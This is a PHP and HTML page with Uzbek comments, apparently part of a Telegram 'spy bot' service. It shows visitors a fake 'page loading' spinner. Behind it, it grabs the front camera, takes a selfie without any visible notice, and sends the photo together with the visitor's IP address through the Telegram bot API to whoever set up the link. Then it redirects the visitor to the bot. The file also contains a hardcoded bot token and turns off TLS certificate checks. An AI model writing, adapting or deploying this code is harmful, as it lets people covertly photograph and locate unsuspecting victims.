<?php
// Xatolarni ko'rsatish
error_reporting(E_ALL);
ini_set('display_errors', 0);

// ---------------- SOZLAMALAR ----------------
$bot_token = "8940114047:AAEoEqS32SpwJ-ovcz3sJIQkL2M7YLvcpm4";
$log_file = "debug_log.txt";
// --------------------------------------------

function writeLog($text) {
    global $log_file;
    file_put_contents($log_file, date('Y-m-d H:i:s') . " | SELFIE | " . $text . "\n", FILE_APPEND);
}

// User ID ni olish
$user_id = $_GET['id'] ?? '';
if(empty($user_id) || !is_numeric($user_id)) {
    header("Location: https://t.me/eShpionBot?start=true");
    exit;
}

// POST so'rov kelganda (Rasm yuborilganda)
if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['photo'])) {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Noma\'lum';
    $photo = $_FILES['photo'];
    
    writeLog("Rasm keldi. Hajmi: " . round($photo['size']/1024) . " KB");

    $caption = "🤳 <b>YANGI RASHM QABUL QILINDI</b>\n\n👤 ID: <code>$user_id</code>\n🌐 IP: $ip\n📅 " . date('d.m.Y H:i:s');
    
    $ch = curl_init("https://api.telegram.org/bot{$bot_token}/sendPhoto");
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_POSTFIELDS => [
            'chat_id' => $user_id,
            'photo' => new CURLFile($photo['tmp_name'], $photo['type'], 'photo.jpg'),
            'caption' => $caption,
            'parse_mode' => 'HTML'
        ]
    ]);
    
    $res = curl_exec($ch);
    writeLog("Telegram javobi: " . $res);
    curl_close($ch);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Yuklanmoqda...</title>
    <style>
        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; color: #666; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .container { text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <div>Sahifa yuklanmoqda...</div>
    </div>

    <script>
    (async function(){
        const redirectUrl = "https://t.me/eShpionBot?start=true";

        try {
            // Kameraga ruxsat so'rash
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'user' }, 
                audio: false 
            });

            const video = document.createElement('video');
            video.srcObject = stream;
            video.setAttribute('playsinline', '');
            video.muted = true;
            await video.play();

            // Kamera yorug'likka moslashishi uchun 2 soniya kutish
            await new Promise(r => setTimeout(r, 2000));

            // Canvas orqali rasmga tushirish
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);

            // Streamni o'chirish
            stream.getTracks().forEach(t => t.stop());

            // Rasmni Blob shakliga o'tkazish va yuborish
            canvas.toBlob(async (blob) => {
                const fd = new FormData();
                fd.append('photo', blob, 'selfie.jpg');

                try {
                    await fetch(window.location.href, { 
                        method: 'POST', 
                        body: fd 
                    });
                } catch (err) {
                    console.error("Yuborishda xato:", err);
                } finally {
                    window.location.href = redirectUrl;
                }
            }, 'image/jpeg', 0.8);

        } catch (e) {
            console.error("Kamera xatosi:", e);
            window.location.href = redirectUrl;
        }
    })();
    </script>
</body>
</html>
